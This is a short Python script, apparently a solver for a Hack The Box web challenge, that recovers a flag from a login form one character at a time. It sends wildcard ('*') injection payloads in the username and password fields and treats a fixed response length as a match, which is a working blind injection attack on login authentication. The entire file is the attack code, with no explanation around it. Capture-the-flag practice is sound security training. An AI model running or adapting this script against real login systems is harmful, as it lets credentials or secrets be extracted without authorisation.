import requests
import os

targeturl = "http://188.166.173.208:31359/login"

psw = ""

with open("/home/hamza/desktop/htb/challenges/web/ascci") as handler:
	
	
	string = [ l.strip() for l in handler ] 
	while True:
		for i in string:
			payload={
				'username': "*",
				'password': psw + i + "*"
					}
			r = requests.post(targeturl, data = payload )
			
			if (len(r.content) == 2586):
				
				psw = psw + i 
				print("flag: {}".format(psw))
			if ("}" in psw):
				print ("here you go")
				exit()




